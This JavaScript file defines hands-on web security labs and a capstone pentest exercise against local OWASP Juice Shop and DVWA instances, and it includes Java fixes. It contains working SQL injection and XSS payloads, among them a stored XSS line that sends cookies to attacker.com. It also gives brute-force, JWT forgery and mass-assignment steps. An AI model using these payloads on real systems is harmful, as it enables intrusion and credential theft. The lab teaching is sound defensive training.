// ── Security Vulnerability Testing — Labs ───────────────────────────
// Standalone lab exercises and capstone project

const SECURITY_CURRICULUM_LABS = [

  {
    id: 'sec-lab-1',
    title: 'Lab 1 — Set Up Your Security Testing Lab',
    type: 'lab',
    duration: '30 min',
    difficulty: 'beginner',
    icon: '🧪',
    objective: 'Install and configure OWASP ZAP, set up OWASP Juice Shop in Docker, and intercept your first HTTP request through ZAP proxy.',
    prerequisites: ['Docker Desktop installed', 'Firefox or Chrome installed', 'Java 11+ installed'],
    steps: [
      {
        step: 1,
        title: 'Launch OWASP Juice Shop in Docker',
        instruction: `Run Juice Shop locally:
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop

Wait 10 seconds, then open: http://localhost:3000
You should see the Juice Shop storefront.`
      },
      {
        step: 2,
        title: 'Download and Start OWASP ZAP',
        instruction: `Download ZAP from: https://www.zaproxy.org/download/
Install and launch. On first run:
→ Choose "I want to use ZAP in browser mode"
→ Select "Automated Scan" → enter target: http://localhost:3000
→ Click "Attack" (or use Manual Explore first)

ZAP will open a proxied browser window.`
      },
      {
        step: 3,
        title: 'Configure Browser Proxy (Manual Explore)',
        instruction: `Alternative — configure proxy manually:

Firefox → Settings → Network Settings → Manual proxy:
  HTTP Proxy: 127.0.0.1  Port: 8080
  Check "Use this proxy for all protocols"

Or install FoxyProxy extension (recommended):
  → Add entry: Pattern = *localhost*, Proxy = 127.0.0.1:8080

Install the ZAP root certificate:
  In ZAP: Tools → Options → Dynamic SSL Certificates → Save
  In Firefox: Settings → Certificates → View Certificates → Import → select the saved cert → Trust for websites`
      },
      {
        step: 4,
        title: 'Intercept Your First Request',
        instruction: `In ZAP: click the green "Set Break" button (or Ctrl+B)
In your proxied browser: browse to http://localhost:3000
ZAP will pause on the first request.

Inspect the request — note:
  - URL, Method, Headers
  - User-Agent string
  - Cookies present

Click the ▶ play button to forward the request.
Toggle off the break when done.`
      },
      {
        step: 5,
        title: 'Run a Spider (Passive Crawl)',
        instruction: `In ZAP: Sites panel → right-click http://localhost:3000
→ Attack → Spider

Watch ZAP discover URLs — the Sites tree will expand with all found pages and API endpoints.

Then: right-click http://localhost:3000 → Attack → Active Scan
(This will take 5-10 minutes — let it run while you explore the Alerts panel)`
      }
    ],
    deliverable: 'Screenshots showing: (1) ZAP proxy intercepting a request with headers visible, (2) ZAP Spider completion with discovered URLs, (3) At least one alert in the ZAP Alerts panel.',
    solution: `Expected ZAP findings on Juice Shop:
- Missing X-Content-Type-Options header
- Missing X-Frame-Options header
- Information disclosure via error messages
- Cookie without HttpOnly flag
These are real Juice Shop vulnerabilities — not false positives.`
  },

  {
    id: 'sec-lab-2',
    title: 'Lab 2 — SQL Injection & XSS Exploitation',
    type: 'lab',
    duration: '45 min',
    difficulty: 'intermediate',
    icon: '💉',
    objective: 'Manually exploit SQL Injection and Cross-Site Scripting vulnerabilities in DVWA, then apply the appropriate fixes in Java.',
    prerequisites: ['DVWA running (Docker: docker run -d -p 80:80 vulnerables/web-dvwa)', 'Burp Suite Community Edition installed', 'Security Level set to Low in DVWA'],
    steps: [
      {
        step: 1,
        title: 'SQLi — Extract Database Version',
        instruction: `DVWA → SQL Injection → Security: Low

Step 1: Confirm injection is possible
  Enter: ' → Does page show SQL error? YES = injectable

Step 2: Find the number of columns
  Enter: ' ORDER BY 1-- -   (no error)
  Enter: ' ORDER BY 2-- -   (no error)
  Enter: ' ORDER BY 3-- -   (error = 2 columns!)

Step 3: Find displayable columns
  Enter: ' UNION SELECT NULL,NULL-- -
  Enter: ' UNION SELECT 'a','b'-- -   ← should show a and b in results

Step 4: Extract database info
  Enter: ' UNION SELECT @@version, database()-- -
  You should see the MySQL version and current DB name!`
      },
      {
        step: 2,
        title: 'SQLi — Extract User Data',
        instruction: `Continue in DVWA SQL Injection:

List all tables:
  ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- -

List columns in users table:
  ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'-- -

Dump all usernames and passwords:
  ' UNION SELECT user, password FROM users-- -

Screenshot: usernames and password hashes displayed on page`
      },
      {
        step: 3,
        title: 'XSS — Reflected vs Stored',
        instruction: `Reflected XSS (DVWA → XSS (Reflected), Security: Low):
  Enter: <script>alert('XSS')</script>
  → Alert box should pop up
  → Note the URL — the payload is IN the URL → shareable link that attacks the viewer

Stored XSS (DVWA → XSS (Stored), Security: Low):
  Name: attacker
  Message: <script>document.location='http://attacker.com/?c='+document.cookie</script>
  → Submit → every user who views this page would have their cookies stolen

DOM XSS (DVWA → XSS (DOM), Security: Low):
  Change URL parameter to: ?default=<script>alert('DOM XSS')</script>
  → Alert fires from DOM manipulation (no server contact needed)`
      },
      {
        step: 4,
        title: 'Java Fix — PreparedStatement for SQLi',
        instruction: `Write the fix:

// VULNERABLE:
String query = "SELECT * FROM users WHERE id = '" + input + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);

// SECURE:
String query = "SELECT * FROM users WHERE id = ?";
PreparedStatement ps = conn.prepareStatement(query);
ps.setString(1, input);   // Input is bound as a parameter, NEVER concatenated
ResultSet rs = ps.executeQuery();

Test the fix: enter ' OR '1'='1 as the input
→ PreparedStatement treats the entire string as a literal value
→ No injection possible`
      },
      {
        step: 5,
        title: 'Java Fix — OWASP Java Encoder for XSS',
        instruction: `Add OWASP Java Encoder to your pom.xml:
<dependency>
  <groupId>org.owasp.encoder</groupId>
  <artifactId>encoder</artifactId>
  <version>1.2.3</version>
</dependency>

// VULNERABLE (in a JSP/template):
<p>Hello, <%= userInput %></p>

// SECURE — encode before rendering:
import org.owasp.encoder.Encode;
String safe = Encode.forHtml(userInput);
// <p>Hello, <%= safe %></p>
// <script>alert('XSS')</script> → &lt;script&gt;alert('XSS')&lt;/script&gt;`
      }
    ],
    deliverable: 'Screenshots: (1) UNION-based SQLi showing MySQL version and database name, (2) User table dump with password hashes, (3) XSS alert popup (Reflected), (4) Working PreparedStatement code, (5) OWASP Encoder applied.',
    solution: `DVWA default credentials: admin / password
MySQL version varies but is typically 5.7.x
Users table has columns: user_id, first_name, last_name, user, password, avatar, last_login, failed_login
Password hashes are MD5 — crackable at crackstation.net

PreparedStatement completely eliminates SQLi. OWASP Encoder eliminates XSS by converting angle brackets to HTML entities.`
  },

  {
    id: 'sec-lab-3',
    title: 'Lab 3 — Authentication, IDOR & JWT Attacks',
    type: 'lab',
    duration: '50 min',
    difficulty: 'intermediate',
    icon: '🔑',
    objective: 'Attack authentication and authorization flaws: brute force a login with Burp Intruder, exploit IDOR in Juice Shop, and forge a JWT token.',
    prerequisites: ['DVWA running with Security: Low', 'Juice Shop running at localhost:3000', 'Burp Suite Community Edition', 'jwt.io accessible'],
    steps: [
      {
        step: 1,
        title: 'Brute Force DVWA Login with Burp Intruder',
        instruction: `DVWA → Brute Force (Security: Low)
Configure browser proxy to Burp (127.0.0.1:8080)

1. Enter any username/password → click Login
2. In Burp: Proxy → HTTP History → find the GET /dvwa/vulnerabilities/brute/... request
3. Right-click → Send to Intruder
4. In Intruder: Positions tab → Clear § → highlight the password value → Add §
5. Payloads tab → Payload Type: Simple List → Add these payloads:
   password, password1, 123456, admin, letmein, abc123, dragon, monkey, sunshine

6. Click "Start Attack"
7. Sort results by Length — the different-length response is the valid login

Screenshot: Intruder results table with valid password highlighted`
      },
      {
        step: 2,
        title: 'IDOR — Access Another User\'s Basket',
        instruction: `Juice Shop → Register two accounts:
  - user1@test.com / Password1!
  - user2@test.com / Password1!

Log in as user1:
  Add an item to the basket
  Open DevTools → Network → find a request to /rest/basket/N (note the basket ID N)

Log in as user2:
  In the URL bar or DevTools, change N to N-1 or N+1
  Or: directly fetch GET http://localhost:3000/rest/basket/1

Screenshot: user2's request returning user1's basket contents (IDOR)

What data is exposed? List the items and prices from the basket.`
      },
      {
        step: 3,
        title: 'Find and Decode the Juice Shop JWT',
        instruction: `Log in to Juice Shop as user1@test.com

In Firefox DevTools → Application → Local Storage → http://localhost:3000
Copy the value of the "token" key

Go to https://jwt.io
Paste the token in the "Encoded" box

Read the decoded payload:
  - What is the "email" claim?
  - What is the "role" claim?
  - When does it expire (convert "exp" Unix timestamp)?
  - What algorithm is used (check header)?

Screenshot: jwt.io with decoded payload showing all claims`
      },
      {
        step: 4,
        title: 'Modify the JWT and Test',
        instruction: `In jwt.io:
1. Change the "email" claim to: admin@juice-sh.op
2. In the Signature section, clear the secret (or type any string)
3. Copy the new "Encoded" token

In browser DevTools → Application → Local Storage:
  Edit the "token" key → paste your modified JWT → press Enter

Refresh the page. Does the app:
  a) Accept the token and show admin features?
  b) Reject it and log you out?

Also test via API:
  DevTools → Network → find any /rest/ request
  Right-click → Edit and Resend (Firefox) with your forged token in Authorization header
  Observe: 200 (accepted!) or 401 (rejected)?`
      },
      {
        step: 5,
        title: 'Try the alg:none Attack',
        instruction: `Using any JWT manipulation tool (e.g., jwt_tool):

pip3 install jwt_tool
python3 -m jwt_tool YOUR_TOKEN -X a

This produces an "alg:none" version of the token.
Replace the stored token with this version and refresh.

Alternatively, manually:
1. Take your JWT, split on "."
2. Base64url decode the header
3. Change alg to "none"
4. Base64url re-encode (no padding) → use as new header
5. Use the same payload
6. Add a trailing dot with nothing after it (empty signature)
7. Join: newHeader.originalPayload.

Try it against /rest/user/whoami — does it return your profile?`
      }
    ],
    deliverable: 'Screenshots: (1) Burp Intruder showing brute force success with valid password identified, (2) IDOR showing another user\'s basket, (3) jwt.io decoded token with claims, (4) Result of modified JWT test (accepted or rejected), (5) alg:none attempt result.',
    solution: `DVWA brute force: password for "admin" is "password"
IDOR: basket IDs are sequential — basket 1 is user 1's basket
JWT: Juice Shop uses HS256 — a valid signature IS required. Modified tokens without a valid signature WILL be rejected. The alg:none attack is rejected by modern Juice Shop versions. This teaches that proper signature verification is working.`
  },

  {
    id: 'sec-lab-4',
    title: 'Lab 4 — API Security Audit',
    type: 'lab',
    duration: '40 min',
    difficulty: 'intermediate',
    icon: '🔌',
    objective: 'Conduct a systematic API security audit of Juice Shop using the OWASP API Security Top 10 as a checklist, documenting findings with severity ratings.',
    prerequisites: ['Juice Shop running at localhost:3000', 'Burp Suite or browser DevTools', 'curl available in terminal'],
    steps: [
      {
        step: 1,
        title: 'Discover the API Surface',
        instruction: `First, find all API endpoints:

1. Browse Juice Shop normally — add items, checkout, etc.
2. Open DevTools → Network → filter by "Fetch/XHR"
3. List every unique /api/ and /rest/ URL you see

Also check:
  curl http://localhost:3000/api-docs
  curl http://localhost:3000/swagger.json

These return Swagger API documentation listing ALL endpoints!
Screenshot: swagger/api-docs JSON showing endpoint list`
      },
      {
        step: 2,
        title: 'Test API1 — Object Level Authorization',
        instruction: `With a regular user token:

Test 1 — Access all users:
  curl -H "Authorization: Bearer YOUR_TOKEN" http://localhost:3000/api/Users/
  → Does it return all users? (Should be admin-only)

Test 2 — Access specific user:
  curl -H "Authorization: Bearer YOUR_TOKEN" http://localhost:3000/api/Users/1
  → Can you see user ID 1 (admin)?

Test 3 — Enumerate via parameter change:
  for id in 1 2 3 4 5; do
    curl -s -H "Authorization: Bearer YOUR_TOKEN" http://localhost:3000/api/Users/$id | head -c 100
    echo ""
  done

Document: which endpoints are accessible that shouldn't be?`
      },
      {
        step: 3,
        title: 'Test API3 — Mass Assignment',
        instruction: `Test if you can set your own role during registration:

curl -X POST http://localhost:3000/api/Users/ \\
  -H "Content-Type: application/json" \\
  -d '{
    "email": "hacker@test.com",
    "password": "Password1!",
    "passwordRepeat": "Password1!",
    "securityQuestion": {"id": 1},
    "securityAnswer": "test",
    "role": "admin",
    "isAdmin": true,
    "totpSecret": ""
  }'

Then log in as hacker@test.com and check:
  curl -X GET http://localhost:3000/rest/user/whoami \\
    -H "Authorization: Bearer YOUR_TOKEN"

Does the response show role: "admin"?`
      },
      {
        step: 4,
        title: 'Test API4 — Rate Limiting & API6 — Data Exposure',
        instruction: `Rate limiting test:
for i in {1..30}; do
  curl -s -o /dev/null -w "%{http_code} " \\
    -X POST http://localhost:3000/rest/user/login \\
    -H "Content-Type: application/json" \\
    -d '{"email":"a@a.com","password":"wrong"}'
done
echo ""
→ If you get 401 every time (never 429) → no rate limiting

Sensitive data exposure:
curl -H "Authorization: Bearer YOUR_TOKEN" \\
  http://localhost:3000/api/Users/ | python3 -m json.tool | grep -E "password|token|email"

What sensitive fields are returned? List them.`
      },
      {
        step: 5,
        title: 'Test API8 — Security Misconfiguration (CORS)',
        instruction: `Check CORS headers on the API:

curl -v -H "Origin: https://evil-attacker.com" \\
  http://localhost:3000/rest/products/search?q=apple 2>&1 | grep -i "access-control"

What is the Access-Control-Allow-Origin value?
  * = Any origin can make cross-origin requests (vulnerability!)
  https://evil-attacker.com = Reflected origin = even worse!
  null = No CORS header set (mixed results depending on browser policy)

Also check security headers:
curl -I http://localhost:3000 | grep -iE "x-frame|x-content|content-security|strict-transport"

Document all missing security headers.`
      }
    ],
    deliverable: `Full API security audit report with findings table:

| Finding | OWASP Category | Severity | Evidence URL | Recommendation |
|---------|---------------|----------|-------------|----------------|
| All users returned to regular user | API1 BOLA | High | GET /api/Users/ | Require admin role |
| Mass assignment: role field accepted | API3 | High | POST /api/Users/ | Use allowlist DTO |
| No rate limiting on login | API4 | Medium | POST /rest/user/login | 429 after 5 attempts |
| ...continue with all findings...`,
    solution: `Juice Shop API findings typically include:
1. API1: /api/Users/ returns all users to any authenticated user
2. API3: Registration accepts extra fields but role elevation may or may not work depending on version
3. API4: No rate limiting — 30 bad login attempts all return 401, never 429
4. API6: /api/Users/ returns password hashes in response
5. API8: CORS may be permissive, security headers missing
6. Swagger docs exposed at /api-docs — reveals all endpoints to attackers`
  },

  {
    id: 'sec-capstone',
    title: 'Capstone — Full Security Assessment & Report',
    type: 'capstone',
    duration: '120 min',
    difficulty: 'advanced',
    icon: '🏆',
    objective: 'Conduct a professional-grade security assessment of OWASP Juice Shop covering all vulnerability categories, produce a CVSS-scored pentest report, and implement automated security gates in CI/CD.',
    prerequisites: ['Completed Labs 1-4', 'ZAP installed', 'Burp Suite Community installed', 'DVWA and Juice Shop running', 'GitHub account'],
    description: `This capstone simulates a real penetration test engagement. You will assess a web application systematically — from reconnaissance to report writing — using the same methodology professional security testers use.`,
    requirements: [
      'Recon: Discover all endpoints using spider/active scan and Swagger',
      'SQLi: Exploit DVWA SQL Injection (Security: Low) to dump the users table',
      'XSS: Execute Stored XSS that simulates cookie theft (logged console.log, not a real exfil)',
      'Access Control: Find 3 IDOR or privilege escalation issues in Juice Shop',
      'JWT: Decode the JWT, attempt modification, document the result',
      'API Security: Run OWASP API Security Top 10 checklist, find 5+ issues',
      'ZAP: Run automated baseline scan, generate HTML report',
      'CI/CD: Create GitHub Actions pipeline with security gates',
      'Report: Professional pentest report with CVSS scores, proof screenshots, and remediation'
    ],
    stages: [
      {
        stage: 'A',
        title: 'Reconnaissance',
        tasks: [
          'Run ZAP Spider on http://localhost:3000 — list all discovered URLs',
          'Find the Swagger/OpenAPI docs endpoint',
          'Identify 10+ unique API endpoints from Swagger',
          'Check /robots.txt, /.well-known/, /sitemap.xml',
          'Note all technologies via response headers (Server, X-Powered-By, framework cookies)'
        ]
      },
      {
        stage: 'B',
        title: 'Vulnerability Exploitation',
        tasks: [
          'DVWA: Complete UNION-based SQLi to dump the full users table (username + password hash)',
          'DVWA: Execute Reflected XSS alert and Stored XSS payload',
          'Juice Shop: Find and exploit 3 access control issues (IDOR, unauthorized endpoints, admin functions)',
          'Juice Shop: Decode JWT, modify a claim, test if server rejects it — document result',
          'Juice Shop: Test for mass assignment via registration endpoint'
        ]
      },
      {
        stage: 'C',
        title: 'Automated Scanning',
        tasks: [
          'Run ZAP Active Scan against Juice Shop',
          'Export ZAP HTML report',
          'Identify top 5 ZAP findings by risk level',
          'Create .zap/rules.tsv to suppress 3 known false positives',
          'Re-scan with rules applied and compare alert counts'
        ]
      },
      {
        stage: 'D',
        title: 'CI/CD Security Gate',
        tasks: [
          'Create GitHub repository',
          'Push .zap/rules.tsv to the repo',
          'Create .github/workflows/security.yml using zaproxy/action-baseline',
          'Configure fail_action: true for High-severity findings',
          'Push → verify pipeline runs → download the artifact HTML report'
        ]
      },
      {
        stage: 'E',
        title: 'Penetration Test Report',
        tasks: [
          'Executive Summary: overall risk rating, number of High/Medium/Low findings',
          'Findings Table: Finding name, CVSS score, CWE ID, evidence URL, screenshot, fix',
          'Detailed Finding: Write one finding in full pentest format (description, reproduction steps, impact, CVSS vector, fix)',
          'Remediation Roadmap: Priority order for fixing all findings',
          'Re-test Plan: How you would verify fixes are effective'
        ]
      }
    ],
    gradingCriteria: {
      pass: 'Min 5 exploited vulnerabilities with screenshots, ZAP report generated, GitHub Actions pipeline green, written report with CVSS scores',
      distinction: 'All above + CVSS vectors calculated for each finding + Java code fixes implemented for SQLi and XSS + nightly ZAP scan scheduled in GitHub Actions'
    },
    sampleReportTemplate: `# Security Assessment Report
## Executive Summary
Target: OWASP Juice Shop v15.x (http://localhost:3000)
Assessment Date: [DATE]
Assessor: [YOUR NAME]
Overall Risk: CRITICAL

### Finding Summary
| Severity | Count |
|----------|-------|
| Critical | 2 |
| High     | 4 |
| Medium   | 6 |
| Low      | 8 |
| Info     | 12 |

---

## Findings

### Finding 1 — SQL Injection in User Search
**Severity:** Critical
**CVSS 3.1 Score:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
**CWE:** CWE-89: Improper Neutralization of Special Elements in SQL Commands
**URL:** /dvwa/vulnerabilities/sqli/?id=PAYLOAD&Submit=Submit
**Parameter:** id

**Description:**
The id parameter is directly concatenated into a SQL query without sanitisation, allowing an attacker to execute arbitrary SQL statements.

**Reproduction Steps:**
1. Navigate to DVWA SQL Injection (Security: Low)
2. Enter: ' UNION SELECT user,password FROM users-- -
3. The page returns all usernames and password hashes

**Impact:**
An unauthenticated attacker can read the entire database, extract credentials, and potentially achieve remote code execution via SQL into outfile.

**Evidence:** [Screenshot]

**Remediation:**
Replace Statement with PreparedStatement. Bind all user input as parameters.
\`\`\`java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setString(1, sanitizedInput);
\`\`\`
---
[Repeat for each finding]`
  }

];

// ── Convert flat labs into curriculum module and push ─────────
(function() {
  const lessons = SECURITY_CURRICULUM_LABS.map(lab => {
    const stepsMarkdown = (lab.steps || []).map(s =>
      `### Step ${s.step}: ${s.title}\n\n${s.instruction}`
    ).join('\n\n---\n\n');

    const content = `## 🎯 Objective\n\n${lab.objective}\n\n` +
      (lab.prerequisites ? `## 📋 Prerequisites\n\n${lab.prerequisites.map(p => `- ${p}`).join('\n')}\n\n` : '') +
      `## 📝 Lab Steps\n\n${stepsMarkdown}` +
      (lab.deliverable ? `\n\n## 📦 Deliverable\n\n${lab.deliverable}` : '') +
      (lab.solution ? `\n\n## ✅ Solution Overview\n\n${lab.solution}` : '');

    return {
      id: lab.id,
      title: lab.title,
      icon: lab.icon || '🔐',
      duration: lab.duration,
      difficulty: lab.difficulty,
      type: 'lab',
      objective: lab.objective,
      content: content,
      exercise: `## Your Task\n\nComplete the lab steps above in your local environment.\n\n**Deliverable:** ${lab.deliverable || 'Working security test achieving the stated objective.'}\n\n**Difficulty:** ${lab.difficulty}`,
      evaluate: `## ✅ Evaluation Criteria\n\n${lab.solution || 'Review your tests against the lab objectives and verify expected results.'}`
    };
  });

  SECURITY_CURRICULUM.push({
    id: 'security-labs-module',
    title: '🔐 Hands-On Security Labs',
    icon: '🔐',
    lessons: lessons
  });
})();
